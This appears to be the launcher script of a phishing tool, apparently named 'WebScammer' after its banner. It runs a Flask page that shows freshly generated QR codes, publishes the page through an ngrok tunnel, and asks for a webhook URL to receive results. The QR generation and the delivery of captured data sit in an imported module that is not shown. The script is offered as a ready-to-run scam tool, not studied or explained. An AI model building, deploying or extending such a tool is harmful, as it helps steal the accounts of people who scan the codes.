import module_qrcode as qr
from flask import Flask,render_template,redirect, url_for,render_template
from colorama import Fore,init
from PIL import Image
import pathlib , os ,time,json,json
from threading import Thread
from pyngrok import ngrok
init()
fichier = os.path.join('static', 'image')
app = Flask(__name__)
@app.route("/")
def main():
	Thread(target=qr.genqr).start()
	time.sleep(5)
	initial_count = -1
	for path in pathlib.Path(fichier).iterdir():
		if path.is_file():
			initial_count += 1
	return render_template("index.html", qrcode = f"{fichier}/qr{initial_count}.png")

@app.route('/image/<filename>')
def display_image(filename):
	return redirect(url_for(filename='image/' + filename))

if __name__ == '__main__':

	try:
		os.system("taskkill /f /im ngrok.exe")
		os.system("cls")
	except:
		os.system("cls")
	with open('config.json') as f:
		config = json.load(f)
		f.close()
	if not config.get('webhook').startswith("https"):
		with open('config.json', 'w') as f:
			link = input("Enter the webhook link : ")
			webhook ={
			    "webhook" : "",
			}
			webhook['webhook'] = link
			json.dump(webhook, f)
	try:
		a = Fore.RED
		b = Fore.WHITE
		print(fr'''
{a}$${b}\      {a}$${b}\           {a}$${b}\        {a}$$$$$${b}\                                                                     
{a}$$ {b}| {a}${b}\  {a}$$ {b}|          {a}$$ {b}|      {a}$${b}  __{a}$${b}\                                                                    
{a}$$ {b}|{a}$$${b}\ {a}$$ {b}| {a}$$$$$${b}\  {a}$$$$$$${b}\  {a}$$ {b}/  \__| {a}$$$$$$${b}\ {a}$$$$$${b}\  {a}$$$$$$\{a}$$$${b}\  {a}$$$$$${b}\{a}$$$${b}\   {a}$$$$$${b}\   {a}$$$$$${b}\  
{a}$$ {a}$$ {a}$${b}\{a}$$ {b}|{a}$$  __{a}$${b}\ {a}$$  {b}__{a}$${b}\ \{a}$$$$$${b}\  {a}$$  {b}_____|\____{a}$${b}\ {a}$$  {b}_{a}$$  {b}_{a}$${b}\ {a}$$  {b}_{a}$$  {b}_{a}$${b}\ {a}$$  {b}__{a}$${b}\ {a}$$  {b}__{a}$${b}\ 
{a}$$$$  {b}_{a}$$$$ {b}|{a}$$$$$$$$ {b}|{a}$$ {b}|  {a}$$ {b}| \____{a}$$\ {a}$$ {b}/      {a}$$$$$$$ {b}|{a}$$ {b}/-{a}$$ {b}/ {a}$$ {b}|{a}$$ {b}/ {a}$$ {b}/ {a}$${b} |{a}$$$$$$$$ |{a}$${b} |  \__|
{a}$$$  {b}/ \{a}$$$ {b}|{a}$$  {b} ____|{a}$$ {b}|  {a}$$ {b}|{a}$${b}\   {a}$$ {b}|{a}$$ {b}|     {a}$$  {b}__{a}$$ {b}|{a}$$ {b}| {a}$$ {b}| {a}$$ {b}|{a}$$ {b}| {a}$$ {b}| {a}$$ {b}|{a}$$   {b}____|{a}$$ {b}|      
{a}$$  {b}/   \{a}$$ {b}|\{a}$$$$$$${b}\ {a}$$$$$$${b}  |\{a}$$$$$$  {b}|\{a}$$$$$$${b}\\{a}$$$$$$$ {b}|{a}$$ {b}| {a}$$ {b}| {a}$$ {b}|{a}$$ {b}| {a}$$ {b}| {a}$$ {b}|\{a}$$$$$$${b}\ {a}$$ {b}|      
{b}\__/     \__| \_______|\_______/  \______/  \_______|\_______|\__| \__| \__|\__| \__| \__| \_______|\__|      
                                                                                                                                                          
                                                                                                                                                          
                                                                                                                                                          

			''')
		print(f"{Fore.CYAN}Your server link is {ngrok.connect(5000)}")
		app.run()
	except:
		print(f"{Fore.CYAN}A web page will be open please create a account [PRESS ENTER TO CONTINUE]")
		input()
		print("[PRESS ENTER TO CONTINUE]")
		os.system('start https://dashboard.ngrok.com/signup')
		input()
		os.system('cls')
		print(f"{Fore.CYAN}A web page will be open please copy your authtoken [PRESS ENTER TO CONTINUE]")
		input()
		os.system("start https://dashboard.ngrok.com/get-started/your-authtoken")
		print(f"[PRESS ENTER TO CONTINUE]{Fore.RESET}")
		input()
		os.system('cls')
		ngrok.set_auth_token(input("Enter your authtoken"))
		app.run()
		print(f"{Fore.CYAN}Your server link is {Fore.RESET}" + ngrok.connect(5000))
